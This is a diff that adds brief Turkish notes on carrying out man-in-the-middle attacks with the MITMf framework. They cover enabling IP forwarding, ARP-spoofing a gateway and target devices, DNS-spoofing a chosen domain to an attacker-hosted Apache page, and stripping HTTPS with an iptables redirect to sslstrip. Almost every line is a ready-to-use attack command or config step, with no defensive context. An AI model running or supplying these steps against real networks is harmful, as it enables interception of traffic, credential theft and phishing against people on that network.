@@ -1,0 +1,20 @@
+MITM Framework ile MITM Saldırısı:
+    ->echo 1 > /proc/sys/net/ipv4/ip_forward (Sistem her yeniden başlatıldığında yazılması gerekir.MITM saldırısı sırasında hedef cihazın internete bağlanabilmesini sağlar.)
+    -> mitm --arp --spoof --gateway <modem_ip> --targets <targets_ip> -i <interface>
+    
+    Hata alırsanız MITM klasöründeki plugin klasörünün içinde Filepwn.py isimli dosyayı silmeniz gereklidir. Hala hata alıyorsanız MITM Framework github sayfasından eksik kütüphanelerin indirilmesi gerekmektedir.
+
+    
+MITM Framework ile DNS Spoof:
+    -> service start apache2 (Komutu ile apache serverimizi başlatıyoruz.)
+    Şimdi dosyalardan ~/var/www/html/index.html adlı dosyayı düzenleyeceğiz.Bu bizim ağ içindeki sitemiz.
+    
+HTTPS Düşürmek:
+    ->iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+    ->sslstrip
+    
+    Domain Yönlendirme:
+        Mıtmf klasöründe Config/Mitmf.conf [DNS] bölümünde[[[A]]] Bölümünü buluyoruz. Bu bölüme yeni satır ekleyerek "*." yazıp devamına hedef sitemizin domain adresini yazıyoruz ve = koyarak yönlendirmek istediğimiz ip adresimizi veya domanin adresimizi yazıyoruz.
+        -> mitm --arp --spoof --gateway <modem_ip> --targets <targets_ip> -i <interface> --dns
+
+        
